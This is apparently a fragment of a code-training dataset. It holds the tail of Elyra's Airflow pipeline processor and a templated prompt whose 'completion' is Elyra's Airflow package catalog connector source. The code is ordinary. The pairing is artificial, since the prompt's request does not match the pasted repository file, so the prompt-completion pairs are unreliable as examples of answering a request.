image_instance.metadata.get(\"pull_secret\"):\n                            runtime_image_pull_secret = image_instance.metadata[\"pull_secret\"]\n                        break\n\n                bootscript = BootscriptBuilder(\n                    filename=operation.filename,\n                    pipeline_name=pipeline_name,\n                    cos_endpoint=cos_endpoint,\n                    cos_bucket=cos_bucket,\n                    cos_directory=artifact_object_prefix,\n                    cos_dependencies_archive=operation_artifact_archive,\n                    inputs=operation.inputs,\n                    outputs=operation.outputs,\n                )\n\n                target_op = {\n                    \"notebook\": operation.name,\n                    \"id\": operation.id,\n                    \"argument_list\": bootscript.container_cmd,\n                    \"runtime_image\": operation.runtime_image,\n                    \"pipeline_envs\": pipeline_envs,\n                    \"parent_operation_ids\": operation.parent_operation_ids,\n                    \"image_pull_policy\": image_pull_policy,\n                    \"cpu_request\": operation.cpu,\n                    \"mem_request\": operation.memory,\n                    \"cpu_limit\": operation.cpu_limit,\n                    \"memory_limit\": operation.memory_limit,\n                    \"gpu_limit\": operation.gpu,\n                    \"gpu_vendor\": operation.gpu_vendor,\n                    \"operator_source\": operation.filename,\n                }\n\n                if runtime_image_pull_secret is not None:\n                    target_op[\"runtime_image_pull_secret\"] = runtime_image_pull_secret\n\n                self.log_pipeline_info(\n                    pipeline_name,\n                    f\"processing operation dependencies for id '{operation.id}'\",\n                    operation_name=operation.name,\n                )\n\n                self._upload_dependencies_to_object_store(\n                    runtime_configuration, pipeline_name, operation, prefix=artifact_object_prefix\n                )\n\n            else:\n                # Retrieve component from cache\n                component = ComponentCache.instance().get_component(self._type, operation.classifier)\n\n                # Convert the user-entered value of certain properties according to their type\n                for component_property in component.properties:\n                    self.log.debug(\n                        f\"Processing component property '{component_property.name}' \"\n                        f\"of type '{component_property.json_data_type}'\"\n                    )\n\n                    # Skip properties for which no value was given\n                    if component_property.ref not in operation.component_props.keys():\n                        continue\n\n                    # Get corresponding property's value from parsed pipeline\n                    property_value_dict = operation.component_props.get(component_property.ref)\n                    data_entry_type = property_value_dict.get(\"widget\", None)  # one of: inputpath, file, raw data type\n                    property_value = property_value_dict.get(\"value\", None)\n\n                    if data_entry_type == \"inputpath\":\n                        # Path-based properties accept an input from a parent\n                        parent_node_name = self._get_node_name(\n                            target_ops, json.loads(json.dumps(property_value))[\"value\"]\n                        )\n                        processed_value = \"\\\"{{ ti.xcom_pull(task_ids='\" + parent_node_name + \"') }}\\\"\"\n                        operation.component_props[component_property.ref] = processed_value\n                    else:  # Property is either of a raw data type or file contents\n                        if data_entry_type == \"file\" and property_value:\n                            # Read a value from a file\n                            absolute_path = get_absolute_path(self.root_dir, property_value)\n                            with open(absolute_path, \"r\") as f:\n                                property_value = f.read() if os.path.getsize(absolute_path) else None\n\n                        # If a value is not found, assign it the default value assigned in parser\n                        if property_value is None:\n                            property_value = component_property.value\n\n                        # Adjust value based on data type for correct rendering in DAG template\n                        if component_property.json_data_type == \"string\":\n                            # Add surrounding quotation marks to string value\n                            operation.component_props[component_property.ref] = json.dumps(property_value)\n                        elif component_property.json_data_type == \"object\":\n                            processed_value = self._process_dictionary_value(property_value)\n                            operation.component_props[component_property.ref] = processed_value\n                        elif component_property.json_data_type == \"array\":\n                            processed_value = self._process_list_value(property_value)\n                            operation.component_props[component_property.ref] = processed_value\n                        else:  # booleans and numbers can be rendered as-is\n                            operation.component_props[component_property.ref] = property_value\n\n                # Remove inputs and outputs from props dict until support for data exchange is provided\n                operation.component_props_as_dict.pop(\"inputs\")\n                operation.component_props_as_dict.pop(\"outputs\")\n\n                # Locate the import statement. If not found raise...\n                import_stmts = []\n                # Check for import statement on Component object, otherwise get from class_import_map\n                import_stmt = component.import_statement or self.class_import_map.get(component.name)\n                if import_stmt:\n                    import_stmts.append(import_stmt)\n                else:\n                    # If we didn't find a mapping to the import statement, let's check if the component\n                    # name includes a package prefix.  If it does, log a warning, but proceed, otherwise\n                    # raise an exception.\n                    if len(component.name.split(\".\")) > 1:  # We (presumably) have a package prefix\n                        self.log.warning(\n                            f\"Operator '{component.name}' of node '{operation.name}' is not configured \"\n                            f\"in the list of available Airflow operators but appears to include a \"\n                            f\"package prefix and processing will proceed.\"\n                        )\n                    else:\n                        raise ValueError(\n                            f\"Operator '{component.name}' of node '{operation.name}' is not configured \"\n                            f\"in the list of available operators.  Please add the fully-qualified \"\n                            f\"package name for '{component.name}' to the \"\n                            f\"AirflowPipelineProcessor.available_airflow_operators configuration.\"\n                        )\n\n                target_op = {\n                    \"notebook\": operation.name,\n                    \"id\": operation.id,\n                    \"imports\": import_stmts,\n                    \"class_name\": component.name,\n                    \"parent_operation_ids\": operation.parent_operation_ids,\n                    \"component_props\": operation.component_props_as_dict,\n                    \"operator_source\": component.component_source,\n                }\n\n            target_op.update(\n                {\n                    \"is_generic_operator\": operation.is_generic,\n                    \"doc\": operation.doc,\n                    \"elyra_props\": operation.elyra_props,\n                }\n            )\n            target_ops.append(target_op)\n\n        ordered_target_ops = OrderedDict()\n\n        while target_ops:\n            for i in range(len(target_ops)):\n                target_op = target_ops.pop(0)\n                if not target_op[\"parent_operation_ids\"]:\n                    ordered_target_ops[target_op[\"id\"]] = target_op\n                    self.log.debug(f\"Added root node {ordered_target_ops[target_op['id']]}\")\n                elif all(deps in ordered_target_ops.keys() for deps in target_op[\"parent_operation_ids\"]):\n                    ordered_target_ops[target_op[\"id\"]] = target_op\n                    self.log.debug(f\"Added dependent node {ordered_target_ops[target_op['id']]}\")\n                else:\n                    target_ops.append(target_op)\n\n        self.log_pipeline_info(pipeline_name, \"pipeline dependencies processed\", duration=(time.time() - t0_all))\n\n        return ordered_target_ops\n\n    def create_pipeline_file(\n        self,\n        pipeline: Pipeline,\n        pipeline_export_format: str,\n        pipeline_export_path: str,\n        pipeline_name: str,\n        pipeline_instance_id: str,\n    ) -> str:\n        \"\"\"\n        Convert the pipeline to an Airflow DAG and store it in pipeline_export_path.\n        \"\"\"\n\n        self.log.info(f\"Creating pipeline definition as a .{pipeline_export_format} file\")\n        if pipeline_export_format == \"json\":\n            with open(pipeline_export_path, \"w\", encoding=\"utf-8\") as file:\n                json.dump(pipeline_export_path, file, ensure_ascii=False, indent=4)\n        else:\n            # Load template from installed elyra package\n            loader = PackageLoader(\"elyra\", \"templates/airflow\")\n            template_env = Environment(loader=loader)\n\n            template_env.filters[\"regex_replace\"] = lambda x: AirflowPipelineProcessor.scrub_invalid_characters(x)\n            template = template_env.get_template(\"airflow_template.jinja2\")\n\n            ordered_ops = self._cc_pipeline(pipeline, pipeline_name, pipeline_instance_id)\n            runtime_configuration = self._get_metadata_configuration(\n                schemaspace=Runtimes.RUNTIMES_SCHEMASPACE_ID, name=pipeline.runtime_config\n            )\n            user_namespace = runtime_configuration.metadata.get(\"user_namespace\", \"default\")\n            cos_secret = runtime_configuration.metadata.get(\"cos_secret\")\n\n            pipeline_description = pipeline.description\n            if pipeline_description is None:\n                pipeline_description = f\"Created with Elyra {__version__} pipeline editor using `{pipeline.source}`.\"\n\n            python_output = template.render(\n                operations_list=ordered_ops,\n                pipeline_name=pipeline_instance_id,\n                user_namespace=user_namespace,\n                cos_secret=cos_secret if any(op.get(\"is_generic_operator\") for op in ordered_ops.values()) else None,\n                kube_config_path=None,\n                is_paused_upon_creation=\"False\",\n                in_cluster=\"True\",\n                pipeline_description=pipeline_description,\n                processor=self,\n            )\n\n            # Write to python file and fix formatting\n            with open(pipeline_export_path, \"w\") as fh:\n                # Defer the import to postpone logger messages: https://github.com/psf/black/issues/2058\n                import black\n\n                autopep_output = autopep8.fix_code(python_output)\n                output_to_file = black.format_str(autopep_output, mode=black.FileMode())\n\n                fh.write(output_to_file)\n\n        return pipeline_export_path\n\n    def _create_unique_node_names(self, operation_list: List[Operation]) -> List[Operation]:\n        unique_names = {}\n        for operation in operation_list:\n            # Ensure operation name is unique\n            new_name = operation.name\n            while new_name in unique_names:\n                new_name = f\"{operation.name}_{unique_names[operation.name]}\"\n                unique_names[operation.name] += 1\n            operation.name = new_name\n\n            unique_names[operation.name] = 1\n\n        return operation_list\n\n    def _scrub_invalid_characters_from_list(self, operation_list: List[Operation]) -> List[Operation]:\n        for operation in operation_list:\n            operation.name = AirflowPipelineProcessor.scrub_invalid_characters(operation.name)\n\n        return operation_list\n\n    @staticmethod\n    def scrub_invalid_characters(name: str) -> str:\n        chars = re.escape(string.punctuation)\n        clean_name = re.sub(r\"[\" + chars + \"\\\\s]\", \"_\", name)  # noqa E226\n        return clean_name\n\n    def _process_dictionary_value(self, value: str) -> Union[Dict, str]:\n        \"\"\"\n        For component properties of type dictionary, if a string value is returned from the superclass\n        method, it must be converted to include surrounding quotation marks for correct rendering\n        in jinja DAG template.\n        \"\"\"\n        converted_value = super()._process_dictionary_value(value)\n        if isinstance(converted_value, str):\n            converted_value = json.dumps(converted_value)\n        return converted_value\n\n    def _process_list_value(self, value: str) -> Union[List, str]:\n        \"\"\"\n        For component properties of type list, if a string value is returned from the superclass\n        method, it must be converted to include surrounding quotation marks for correct rendering\n        in jinja DAG template.\n        \"\"\"\n        converted_value = super()._process_list_value(value)\n        if isinstance(converted_value, str):\n            converted_value = json.dumps(converted_value)\n        return converted_value\n\n    def _get_node_name(self, operations_list: list, node_id: str) -> Optional[str]:\n        for operation in operations_list:\n            if operation[\"id\"] == node_id:\n                return operation[\"notebook\"]\n        return None\n\n    def render_volumes(self, elyra_properties: Dict[str, ElyraProperty]) -> str:\n        \"\"\"\n        Render volumes defined for an operation for use in the Airflow DAG template\n        :returns: a string literal containing the python code to be rendered in the DAG\n        \"\"\"\n        str_to_render = \"\"\n        for v in elyra_properties.get(pipeline_constants.MOUNTED_VOLUMES, []):\n            str_to_render += f\"\"\"\n                k8s.V1Volume(\n                    name=\"{v.pvc_name}\",\n                    persistent_volume_claim=k8s.V1PersistentVolumeClaimVolumeSource(\n                        claim_name=\"{v.pvc_name}\",\n                    ),\n                ),\"\"\"\n        # set custom shared memory size\n        shm = elyra_properties.get(pipeline_constants.KUBERNETES_SHARED_MEM_SIZE)\n        if shm is not None and shm.size:\n            str_to_render += f\"\"\"\n                k8s.V1Volume(\n                    name=\"shm\",\n                    empty_dir=k8s.V1EmptyDirVolumeSource(\n                        medium=\"Memory\",\n                        size_limit=\"{shm.size}{shm.units}\",\n                    ),\n                ),\"\"\"\n        return dedent(str_to_render)\n\n    def render_mounts(self, elyra_properties: Dict[str, ElyraProperty]) -> str:\n        \"\"\"\n        Render volume mounts defined for an operation for use in the Airflow DAG template\n        :returns: a string literal containing the python code to be rendered in the DAG\n        \"\"\"\n        str_to_render = \"\"\n        for v in elyra_properties.get(pipeline_constants.MOUNTED_VOLUMES, []):\n            str_to_render += f\"\"\"\n                k8s.V1VolumeMount(\n                    name=\"{v.pvc_name}\",\n                    mount_path=\"{v.path}\",\n                    sub_path=\"{v.sub_path}\",\n                    read_only={v.read_only},\n                ),\"\"\"\n        return dedent(str_to_render)\n\n    def render_secrets(self, elyra_properties: Dict[str, ElyraProperty], cos_secret: Optional[str]) -> str:\n        \"\"\"\n        Render Kubernetes secrets defined for an operation for use in the Airflow DAG template\n        :returns: a string literal containing the python code to be rendered in the DAG\n        \"\"\"\n        str_to_render = \"\"\n        if cos_secret:\n            str_to_render += f\"\"\"\n                Secret(\"env\", \"AWS_ACCESS_KEY_ID\", \"{cos_secret}\", \"AWS_ACCESS_KEY_ID\"),\n                Secret(\"env\", \"AWS_SECRET_ACCESS_KEY\", \"{cos_secret}\", \"AWS_SECRET_ACCESS_KEY\"),\"\"\"\n        for s in elyra_properties.get(pipeline_constants.KUBERNETES_SECRETS, []):\n            str_to_render += f\"\"\"\n                Secret(\"env\", \"{s.env_var}\", \"{s.name}\", \"{s.key}\"),\"\"\"\n        return dedent(str_to_render)\n\n    def render_annotations(self, elyra_properties: Dict[str, ElyraProperty]) -> Dict:\n        \"\"\"\n        Render Kubernetes annotations defined for an operation for use in the Airflow DAG template\n        :returns: a string literal containing the python code to be rendered in the DAG\n        \"\"\"\n        annotations = elyra_properties.get(pipeline_constants.KUBERNETES_POD_ANNOTATIONS, ElyraPropertyList([]))\n        return {key: value or \"\" for key, value in annotations.to_dict().items()}\n\n    def render_labels(self, elyra_properties: Dict[str, ElyraProperty]) -> Dict:\n        \"\"\"\n        Render Kubernetes labels defined for an operation for use in the Airflow DAG template\n        :returns: a string literal containing the python code to be rendered in the DAG\n        \"\"\"\n        labels = elyra_properties.get(pipeline_constants.KUBERNETES_POD_LABELS, ElyraPropertyList([]))\n        return {key: value or \"\" for key, value in labels.to_dict().items()}\n\n    def render_tolerations(self, elyra_properties: Dict[str, ElyraProperty]):\n        \"\"\"\n        Render any Kubernetes tolerations defined for an operation for use in the Airflow DAG template\n        :returns: a string literal containing the python code to be rendered in the DAG\n        \"\"\"\n        str_to_render = \"\"\n        for t in elyra_properties.get(pipeline_constants.KUBERNETES_TOLERATIONS, []):\n            key = f'\"{t.key}\"' if t.key is not None else t.key\n            value = f'\"{t.value}\"' if t.value is not None else t.value\n            effect = f'\"{t.effect}\"' if t.effect is not None else t.effect\n            str_to_render += f\"\"\"\n                {{\"key\": {key}, \"operator\": \"{t.operator}\", \"value\": {value}, \"effect\": {effect}}},\"\"\"\n        return dedent(str_to_render)\n\n    def render_elyra_owned_properties(self, elyra_properties: Dict[str, ElyraProperty]):\n        \"\"\"\n        Build the KubernetesExecutor object for the given operation for use in the DAG.\n        \"\"\"\n        kubernetes_executor = {}\n        for value in elyra_properties.values():\n            if isinstance(value, (ElyraProperty, ElyraPropertyList)):\n                value.add_to_execution_object(runtime_processor=self, execution_object=kubernetes_executor)\n\n        return {\"KubernetesExecutor\": kubernetes_executor} if kubernetes_executor else {}\n\n    def add_mounted_volume(self, instance: VolumeMount, execution_object: Any, **kwargs) -> None:\n        \"\"\"Add VolumeMount instance to the execution object for the given runtime processor\"\"\"\n        if \"volumes\" not in execution_object:\n            execution_object[\"volumes\"] = []\n        if \"volume_mounts\" not in execution_object:\n            execution_object[\"volume_mounts\"] = []\n        execution_object[\"volumes\"].append(\n            {\n                \"name\": instance.pvc_name,\n                \"persistentVolumeClaim\": {\"claimName\": instance.pvc_name},\n            }\n        )\n        execution_object[\"volume_mounts\"].append(\n            {\n                \"mountPath\": instance.path,\n                \"name\": instance.pvc_name,\n                \"sub_path\": instance.sub_path,\n                \"read_only\": instance.read_only,\n            }\n        )\n\n    def add_kubernetes_pod_annotation(self, instance: KubernetesAnnotation, execution_object: Any, **kwargs) -> None:\n        \"\"\"Add KubernetesAnnotation instance to the execution object for the given runtime processor\"\"\"\n        if \"annotations\" not in execution_object:\n            execution_object[\"annotations\"] = {}\n        execution_object[\"annotations\"][instance.key] = instance.value or \"\"\n\n    def add_kubernetes_pod_label(self, instance: KubernetesLabel, execution_object: Any, **kwargs) -> None:\n        \"\"\"Add KubernetesLabel instance to the execution object for the given runtime processor\"\"\"\n        if \"labels\" not in execution_object:\n            execution_object[\"labels\"] = {}\n        execution_object[\"labels\"][instance.key] = instance.value or \"\"\n\n    def add_kubernetes_toleration(self, instance: KubernetesToleration, execution_object: Any, **kwargs) -> None:\n        \"\"\"Add KubernetesToleration instance to the execution object for the given runtime processor\"\"\"\n        if \"tolerations\" not in execution_object:\n            execution_object[\"tolerations\"] = []\n        execution_object[\"tolerations\"].append(\n            {\n                \"key\": instance.key,\n                \"operator\": instance.operator,\n                \"value\": instance.value,\n                \"effect\": instance.effect,\n            }\n        )\n\n    def add_custom_shared_memory_size(self, instance: CustomSharedMemorySize, execution_object: Any, **kwargs) -> None:\n        \"\"\"Add CustomSharedMemorySize instance to the execution object for the given runtime processor\"\"\"\n\n        if not instance.size:\n            return\n\n        if \"volumes\" not in execution_object:\n            execution_object[\"volumes\"] = []\n        if \"volume_mounts\" not in execution_object:\n            execution_object[\"volume_mounts\"] = []\n        execution_object[\"volumes\"].append(\n            {\n                \"name\": \"shm\",\n                \"emptyDir\": {\"medium\": \"Memory\", \"sizeLimit\": f\"{instance.size}{instance.units}\"},\n            }\n        )\n        execution_object[\"volume_mounts\"].append(\n            {\"mountPath\": \"/dev/shm\", \"name\": \"shm\", \"sub_path\": None, \"read_only\": False},\n        )\n\n    @property\n    def supported_properties(self) -> Set[str]:\n        \"\"\"A list of Elyra-owned properties supported by this runtime processor.\"\"\"\n        return {\n            pipeline_constants.ENV_VARIABLES,\n            pipeline_constants.KUBERNETES_SECRETS,\n            pipeline_constants.MOUNTED_VOLUMES,\n            pipeline_constants.KUBERNETES_POD_ANNOTATIONS,\n            pipeline_constants.KUBERNETES_POD_LABELS,\n            pipeline_constants.KUBERNETES_TOLERATIONS,\n            pipeline_constants.KUBERNETES_SHARED_MEM_SIZE,\n        }\n\n    @property\n    def pipeline_parameter_class(self) -> Optional[type]:\n        \"\"\"AirflowPipelineProcessor does not support pipeline parameters.\"\"\"\n        return None\n\n\nclass AirflowPipelineProcessorResponse(RuntimePipelineProcessorResponse):\n    _type = RuntimeProcessorType.APACHE_AIRFLOW\n    _name = \"airflow\"\n\n    def __init__(self, git_url, run_url, object_storage_url, object_storage_path):\n        super().__init__(run_url, object_storage_url, object_storage_path)\n        self.git_url = git_url\n\n    def to_json(self):\n        response = super().to_json()\n        response[\"git_url\"] = self.git_url\n        return response\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/airflow_processor.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.84, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport ast\nimport os\nfrom pathlib import Path\nimport shutil\nfrom tempfile import mkdtemp\nfrom typing import Any\nfrom typing import Dict\nfrom typing import List\nfrom typing import Optional\nfrom urllib.parse import urlparse\nimport zipfile\n\nfrom requests import session\nfrom requests.auth import HTTPBasicAuth\n\nfrom elyra.pipeline.catalog_connector import AirflowEntryData\nfrom elyra.pipeline.catalog_connector import ComponentCatalogConnector\nfrom elyra.pipeline.catalog_connector import EntryData\nfrom elyra.util.url import FileTransportAdapter\nfrom elyra.util.url import get_verify_parm\n\n\nclass AirflowPackageCatalogConnector(ComponentCatalogConnector):\n    \"\"\"\n    Provides access to operators that are defined in Apache Airflow wheel archives.\n    \"\"\"\n\n    REQUEST_TIMEOUT = 30\n\n    def get_catalog_entries(self, catalog_metadata: Dict[str, Any]) -> List[Dict[str, Any]]:\n        \"\"\"\n        Returns a list containing an entry for each Apache Airflow operator that was\n        detected in the specified Apache Airflow wheel archive.\n\n        :param catalog_metadata: contains information needed to download the archive using an HTTP GET request\n        \"\"\"\n\n        # Return data structure contains a list of Python scripts in the referenced\n        # Apache Airflow wheel that appear to implement at least one operator\n        # Each entry defines two keys:\n        #  - 'airflow_package': The name of the Airflow package the user specified.\n        #    This is included for informational purposes only.\n        #  - 'file': Python script name\n        operator_key_list = []\n\n        # Read the user-supplied 'airflow_package_download_url', which is a required\n        # input defined in the 'airflow-package-catalog-catalog.json' schema file.\n        # Example value: https://archive.apache.org/dist/airflow/1.10.15/apache_airflow-1.10.15-py2.py3-none-any.whl\n        airflow_package_download_url = catalog_metadata[\"airflow_package_download_url\"]\n        # extract the package name, e.g. 'apache_airflow-1.10.15-py2.py3-none-any.whl'\n        airflow_package_name = Path(urlparse(airflow_package_download_url).path).name\n\n        if not airflow_package_name:\n            self.log.error(\n                f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                \"is not configured properly. \"\n                f\"The package download URL '{airflow_package_download_url}' \"\n                \"does not include a file name.\"\n            )\n            return operator_key_list\n\n        pr = urlparse(airflow_package_download_url)\n        auth = None\n\n        if pr.scheme != \"file\":\n            # determine whether authentication needs to be performed\n            auth_id = catalog_metadata.get(\"auth_id\")\n            auth_password = catalog_metadata.get(\"auth_password\")\n            if auth_id and auth_password:\n                auth = HTTPBasicAuth(auth_id, auth_password)\n            elif auth_id or auth_password:\n                self.log.error(\n                    f\"Error. Airflow connector '{catalog_metadata.get('display_name')}' \"\n                    \"is not configured properly. \"\n                    \"Authentication requires a user id and password or API key.\"\n                )\n                return operator_key_list\n\n        # tmp_archive_dir is used to store the downloaded archive and as working directory\n        if hasattr(self, \"tmp_archive_dir\"):\n            # if the directory exists remove it in case the archive content has changed\n            shutil.rmtree(self.tmp_archive_dir.name, ignore_errors=True)\n        self.tmp_archive_dir = Path(mkdtemp())\n\n        try:\n            self.log.debug(f\"Downloading Apache Airflow package from '{airflow_package_download_url}' ...\")\n\n            # download archive; abort after 30 seconds\n            try:\n                requests_session = session()\n                if pr.scheme == \"file\":\n                    requests_session.mount(\"file://\", FileTransportAdapter())\n                response = requests_session.get(\n                    airflow_package_download_url,\n                    timeout=AirflowPackageCatalogConnector.REQUEST_TIMEOUT,\n                    allow_redirects=True,\n                    auth=auth,\n                    verify=get_verify_parm(),\n                )\n            except Exception as ex:\n                self.log.error(\n                    f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"encountered an issue downloading '{airflow_package_download_url}': {ex}\"\n                )\n                return operator_key_list\n            if response.status_code != 200:\n                # download failed. Log error and abort processing\n                self.log.error(\n                    f\"Error. The Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"encountered an issue downloading '{airflow_package_download_url}'. \"\n                    f\"HTTP response code: {response.status_code}\"\n                )\n                return operator_key_list\n\n            # save downloaded archive\n            archive = str(self.tmp_archive_dir / airflow_package_name)\n            self.log.debug(f\"Saving downloaded archive in '{archive}' ...\")\n            with open(archive, \"wb\") as archive_fh:\n                archive_fh.write(response.content)\n\n            # extract archive\n            self.log.debug(f\"Extracting Airflow archive '{archive}' ...\")\n            try:\n                with zipfile.ZipFile(archive, \"r\") as zip_ref:\n                    zip_ref.extractall(self.tmp_archive_dir)\n            except Exception as ex:\n                self.log.error(\n                    f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"encountered an issue extracting downloaded archive '{archive}': \"\n                    f\"{ex}\"\n                )\n                os.remove(archive)\n                return operator_key_list\n\n            # delete archive\n            self.log.debug(f\"Deleting downloaded Airflow archive '{archive}' ...\")\n            os.remove(archive)\n\n            # Locate Python scripts that are stored in the 'airflow/operators' directory\n            python_scripts = [s for s in self.tmp_archive_dir.glob(\"airflow/operators/*.py\")]\n\n            # If requested, also locate Python scripts that are stored in the 'airflow/contrib/operators' directory\n            if catalog_metadata.get(\"search_contrib\"):\n                python_scripts.extend([s for s in self.tmp_archive_dir.glob(\"airflow/contrib/operators/*.py\")])\n\n            #\n            # Identify Python scripts that define classes that extend the\n            # airflow.models.BaseOperator class\n            #\n            scripts_with_operator_class: List[str] = []  # Python scripts that contain operator definitions\n            extends_baseoperator: List[str] = []  # Classes that extend BaseOperator\n            classes_to_analyze = {}\n            imported_operator_classes: List[str] = []  # Imported operator classes\n            offset = len(str(self.tmp_archive_dir)) + 1\n            script_count = 0  # used for stats collection\n            # process each Python script ...\n            for script in python_scripts:\n                if script.name == \"__init__.py\":\n                    continue\n                script_id = str(script)[offset:]\n                script_count += 1\n                self.log.debug(f\"Parsing '{script}' ...\")\n                with open(script, \"r\") as source_code:\n                    # parse source code\n                    tree = ast.parse(source_code.read())\n                    # identify imports and class definitions\n                    for node in ast.walk(tree):\n                        if isinstance(node, ast.Import):\n                            # Need to handle 'import airflow' in the future,\n                            # should this ever surface in operator source code files\n                            pass\n                        elif isinstance(node, ast.ImportFrom):\n                            node_module = node.module\n                            for name in node.names:\n                                if \"airflow.models\" == node_module and name.name == \"BaseOperator\":\n                                    imported_operator_classes.append(name.name)\n                        elif isinstance(node, ast.ClassDef):\n                            # determine whether this class extends the BaseOperator class\n                            self.log.debug(f\"Analyzing class '{node.name}' in {script_id} ...\")\n                            self.log.debug(f\" Class {node.name} extends {[n.id for n in node.bases]}\")\n                            # determine whether class extends one of the imported operator classes\n                            if len(node.bases) == 0:\n                                # class does not extend other classes; it therefore does\n                                # not extend the Airflow BaseOperator; skip class\n                                continue\n                            for base in node.bases:\n                                extends = False\n                                if base.id in imported_operator_classes:\n                                    # class extends Airflow BaseOperator\n                                    extends = True\n                                    extends_baseoperator.append(node.name)\n                                    if script_id not in scripts_with_operator_class:\n                                        scripts_with_operator_class.append(script_id)\n                                    break\n                            if extends is False:\n                                # need to further analyze whether this class\n                                # extends Airflow BaseOperator\n                                classes_to_analyze[node.name] = {\"node\": node, \"file\": script_id}\n\n            # Identify classes that extend BaseOperator by extending\n            # classes that were identified as extending BaseOperator\n            # Example:\n            #  class MyBaseOperator(BaseOperator)\n            #  class MyOperator(MyBaseOperator)\n            analysis_complete = len(classes_to_analyze) == 0\n            while analysis_complete is False:\n                # assume that analysis is complete until proven otherwise\n                analysis_complete = True\n                for class_name in list(classes_to_analyze.keys()):\n                    self.log.debug(\n                        f\"Re-analyzing class '{class_name}' in \" f\"'{classes_to_analyze[class_name]['file']}'... \"\n                    )\n                    for base in classes_to_analyze[class_name][\"node\"].bases:\n                        if base.id in extends_baseoperator:\n                            # this class extends BaseOperator\n                            extends_baseoperator.append(class_name)\n                            if classes_to_analyze[class_name][\"file\"] not in scripts_with_operator_class:\n                                scripts_with_operator_class.append(classes_to_analyze[class_name][\"file\"])\n                            # remove class from todo list\n                            del classes_to_analyze[class_name]\n                            # A new class was discovered that implements\n                            # BaseOperator. Analysis needs to be repeated because\n                            # OTHER classes might extend THIS class.\n                            analysis_complete = False\n                            break\n\n            # Populate return data structure\n            for script in scripts_with_operator_class:\n                operator_key_list.append({\"airflow_package\": airflow_package_name, \"file\": script})\n\n            # Dump stats\n            self.log.info(\n                f\"Analysis of '{airflow_package_download_url}' completed. \"\n                f\"Located {len(extends_baseoperator)} operator classes \"\n                f\"in {len(scripts_with_operator_class)} Python scripts.\"\n            )\n            self.log.debug(f\"Operator key list: {operator_key_list}\")\n        except Exception as ex:\n            self.log.error(\n                f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                \"encountered an issue processing operator list in Airflow package \"\n                f\"'{airflow_package_download_url}': {ex}\"\n            )\n\n        return operator_key_list\n\n    def get_entry_data(\n        self, catalog_entry_data: Dict[str, Any], catalog_metadata: Dict[str, Any]\n    ) -> Optional[EntryData]:\n        \"\"\"\n        Fetch the component that is identified by catalog_entry_data from\n        the downloaded Apache Airflow package.\n\n        :param catalog_entry_data: a dictionary that contains the information needed to read the content\n                                   of the component definition\n        :param catalog_metadata: the metadata associated with the catalog in which this catalog entry is\n                                 stored; in addition to catalog_entry_data, catalog_metadata may also be\n                                 needed to read the component definition for certain types of catalogs\n\n        :returns: An AirflowEntryData containing the definition and metadata, if found\n        \"\"\"\n        operator_file_name = catalog_entry_data.get(\"file\")\n\n        if hasattr(self, \"tmp_archive_dir\") is False:\n            # Log error and return None\n            self.log.error(\n                f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                \"encountered an issue reading the operator source: The downloaded file was not found.\"\n            )\n            return None\n\n        # Compose package name from operator_file_name, e.g.\n        # 'airflow/operators/papermill_operator.py' => 'airflow.operators.papermill_operator'\n        package = \".\".join(Path(operator_file_name).with_suffix(\"\").parts)\n\n        # load operator source using the provided key\n        operator_source = self.tmp_archive_dir / operator_file_name\n        self.log.debug(f\"Reading operator source '{operator_source}' ...\")\n        try:\n            with open(operator_source, \"r\") as source:\n                return AirflowEntryData(definition=source.read(), package_name=package)\n        except Exception as ex:\n            self.log.error(\n                f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                f\"encountered an issue reading the operator source '{operator_source}': {ex}\"\n            )\n\n        return None\n\n    @classmethod\n    def get_hash_keys(cls) -> List[Any]:\n        \"\"\"\n        Instructs Elyra to use the specified keys to generate a unique\n        hash value for item returned by get_catalog_entries\n        :returns: a list of keys\n        \"\"\"\n        # Example key values:\n        # - file: operators/bash_operator.py\n        return [\"file\"]\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/package_catalog_connector/airflow_package_catalog_connector.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
